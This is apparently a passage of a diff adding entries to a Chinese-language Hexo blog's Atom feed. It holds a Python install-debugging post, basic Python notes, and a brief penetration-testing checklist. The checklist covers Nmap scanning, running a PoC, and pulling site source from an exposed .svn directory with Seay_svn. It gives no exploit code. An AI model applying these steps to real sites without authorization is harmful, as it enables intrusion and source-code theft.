href="#结果" class="headerlink" title="#结果"></a>#结果</h3><p><img src="/images/pasted-184.png" alt="upload successful"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;前提&quot;&gt;&lt;a href=&quot;#前提&quot; class=&quot;headerlink&quot; title=&quot;#前提&quot;&gt;&lt;/a&gt;#前提&lt;/h3&gt;&lt;p&gt;安装2.7和3.6的情况下 没有pip3&lt;/p&gt;
+&lt;h3 id=&quot;调试（1）&quot;&gt;&lt;a href=&quot;#调试（1）&quot; class=&quot;headerlink&quot; title=&quot;#调试（1）&quot;&gt;&lt;/a&gt;#调试（1）&lt;/h3&gt;&lt;p&gt;&lt;code&gt;brew reinstall python3 --with-brewed-openssl&lt;/code&gt;&lt;br&gt;然而下载完毕后pip3的版本过低 按照提示更新&lt;br&gt;&lt;code&gt;sudo pip3 install --upgrade pip&lt;/code&gt;&lt;br&gt;然而满屏报错…&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="教程" scheme="http://yoursite.com/categories/%E6%95%99%E7%A8%8B/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Python(2)</title>
+    <link href="http://yoursite.com/2020/02/03/Python-2/"/>
+    <id>http://yoursite.com/2020/02/03/Python-2/</id>
+    <published>2020-02-03T02:43:00.000Z</published>
+    <updated>2020-02-03T02:47:23.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="sys模块"><a href="#sys模块" class="headerlink" title="#sys模块"></a>#sys模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">print sys.argv[0]</span><br></pre></td></tr></table></figure><p><code>sys.argv[0]</code>输出文件本身路径<br>所带参数从 <code>sys.argv[1]</code>开始</p><a id="more"></a><h3 id="字符串"><a href="#字符串" class="headerlink" title="#字符串"></a>#字符串</h3><p>最左：0 1 2 3 … <code>s[0:]</code><br>最右：… -3 -2 -1 <code>s[:-1]</code><br>开始截取时，包含了下边界，而截取到最大范围不包括上边界<br><code>print s 2</code> 输出字符串俩次</p><h3 id="字典映射替代switch"><a href="#字典映射替代switch" class="headerlink" title="#字典映射替代switch"></a>#字典映射替代switch</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">def zero():</span><br><span class="line">    return &quot;zero&quot;</span><br><span class="line"></span><br><span class="line">def one():</span><br><span class="line">    return &quot;one&quot;</span><br><span class="line"></span><br><span class="line">def two():</span><br><span class="line">    return &quot;two&quot;</span><br><span class="line"></span><br><span class="line">def num2Str(arg):</span><br><span class="line">    switcher&#x3D;&#123;</span><br><span class="line">        0:zero,</span><br><span class="line">        1:one,</span><br><span class="line">        2:two,</span><br><span class="line">        3:lambda:&quot;three&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    func&#x3D;switcher.get(arg,lambda:&quot;nothing&quot;)</span><br><span class="line">    return func()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    print num2Str(0)</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;sys模块&quot;&gt;&lt;a href=&quot;#sys模块&quot; class=&quot;headerlink&quot; title=&quot;#sys模块&quot;&gt;&lt;/a&gt;#sys模块&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;#!&amp;#x2F;usr&amp;#x2F;bin&amp;#x2F;python&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# -*- coding: UTF-8 -*-&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;import sys&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print sys.argv[0]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;code&gt;sys.argv[0]&lt;/code&gt;输出文件本身路径&lt;br&gt;所带参数从 &lt;code&gt;sys.argv[1]&lt;/code&gt;开始&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>三脚猫小套路</title>
+    <link href="http://yoursite.com/2020/02/03/%E4%B8%89%E8%84%9A%E7%8C%AB%E5%B0%8F%E5%A5%97%E8%B7%AF/"/>
+    <id>http://yoursite.com/2020/02/03/三脚猫小套路/</id>
+    <published>2020-02-03T02:36:00.000Z</published>
+    <updated>2020-02-04T09:06:08.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="扫站"><a href="#扫站" class="headerlink" title="#扫站"></a>#扫站</h3><p>1.1 Nmap端口扫描<br><img src="/images/pasted-179.png" alt="upload successful"></p><a id="more"></a><p>1.2 通过web访问端口 若可以访问 再用对应脚本扫<br><img src="/images/pasted-180.png" alt="upload successful"><br>1.3 进行poc攻击<br><img src="/images/pasted-181.png" alt="upload successful"><br>命令行：whoiam/ls</p><h3 id="svn源码泄露"><a href="#svn源码泄露" class="headerlink" title="#svn源码泄露"></a>#svn源码泄露</h3><p>2.1 扫描目录存在.svn<br>2.2 尝试访问/.svn/entries<br>2.3 使用Seay_svn 可将网页全部源码download</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;扫站&quot;&gt;&lt;a href=&quot;#扫站&quot; class=&quot;headerlink&quot; title=&quot;#扫站&quot;&gt;&lt;/a&gt;#扫站&lt;/h3&gt;&lt;p&gt;1.1 Nmap端口扫描&lt;br&gt;&lt;img src=&quot;/images/pasted-179.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+  </entry>
+  
+</feed>
